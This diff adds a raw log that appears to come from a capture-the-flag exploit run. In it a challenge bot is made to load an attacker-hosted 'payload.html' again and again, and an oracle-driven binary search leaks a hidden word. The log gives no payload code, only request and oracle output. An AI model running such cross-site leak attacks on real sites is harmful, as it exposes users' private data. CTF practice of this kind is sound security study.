@@ -1,0 +1,85 @@
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=1024 z_before=1 z_after=2 oracle_before=6 oracle_after=6
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=512 z_before=2 z_after=3 oracle_before=6 oracle_after=6
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=256 z_before=3 z_after=4 oracle_before=6 oracle_after=6
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=128 z_before=4 z_after=5 oracle_before=6 oracle_after=6
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=64 z_before=5 z_after=6 oracle_before=6 oracle_after=6
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=32 z_before=6 z_after=7 oracle_before=6 oracle_after=7
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=32 z_before=7 z_after=8 oracle_before=10 oracle_after=11
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=64 z_before=8 z_after=9 oracle_before=11 oracle_after=12
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=128 z_before=9 z_after=10 oracle_before=15 oracle_after=16
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=256 z_before=10 z_after=11 oracle_before=16 oracle_after=16
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=128 z_before=11 z_after=12 oracle_before=16 oracle_after=16
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=64 z_before=12 z_after=13 oracle_before=16 oracle_after=17
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=64 z_before=13 z_after=14 oracle_before=20 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=128 z_before=14 z_after=15 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=64 z_before=15 z_after=16 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=32 z_before=16 z_after=17 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=16 z_before=17 z_after=18 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=8 z_before=18 z_after=19 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=4 z_before=19 z_after=20 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=2 z_before=20 z_after=21 oracle_before=21 oracle_after=21
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=1 z_before=21 z_after=22 oracle_before=21 oracle_after=21
+[word] copy
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=1 z_before=22 z_after=23 oracle_before=21 oracle_after=22
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=2 z_before=23 z_after=24 oracle_before=25 oracle_after=27
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (3/3 active)"}
+[query_words] size=4 z_before=24 z_after=25 oracle_before=29 oracle_after=31
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (3/3 active)"}
+[query_words] size=8 z_before=25 z_after=26 oracle_before=33 oracle_after=35
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (3/3 active)"}
+[query_words] size=16 z_before=26 z_after=27 oracle_before=37 oracle_after=39
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (3/3 active)"}
+[query_words] size=32 z_before=27 z_after=28 oracle_before=42 oracle_after=44
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (3/3 active)"}
+[query_words] size=64 z_before=28 z_after=29 oracle_before=47 oracle_after=49
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=512 z_before=29 z_after=30 oracle_before=50 oracle_after=50
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=256 z_before=30 z_after=31 oracle_before=50 oracle_after=50
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=128 z_before=31 z_after=32 oracle_before=50 oracle_after=51
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=128 z_before=32 z_after=33 oracle_before=53 oracle_after=55
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=256 z_before=33 z_after=34 oracle_before=55 oracle_after=55
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=128 z_before=34 z_after=35 oracle_before=55 oracle_after=55
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (3/3 active)"}
+[query_words] size=64 z_before=35 z_after=36 oracle_before=55 oracle_after=55
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (1/3 active)"}
+[query_words] size=32 z_before=36 z_after=37 oracle_before=55 oracle_after=56
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=32 z_before=37 z_after=38 oracle_before=59 oracle_after=60
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=64 z_before=38 z_after=39 oracle_before=60 oracle_after=62
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=128 z_before=39 z_after=40 oracle_before=64 oracle_after=65
+[visit] {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html for up to 45 seconds... (2/3 active)"}
+[query_words] size=1024 z_before=40 z_after=41 oracle_before=67 oracle_after=69
+[done] found 1 candidate words -> /media/p0mb3r0/4tb/CTF/ctf-metared/beginner/memento/cha/bugbounty-claude/datos/web/diceex/found_words.txt
+[visit] token=q0001 port=14001 {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=q0001 for up to 45 seconds... (1/3 active)"}
+[query_pos] token=q0001 word=zoo range=1-12 state={"oracle_hit": false, "oracle_listen": true, "z_hit": true}
+[visit] token=q0002 port=14002 {"ok":true,"message":"Visiting http://122.218.146.XXX/payload.html?t=q0002 for up to 45 seconds... (1/3 active)"}
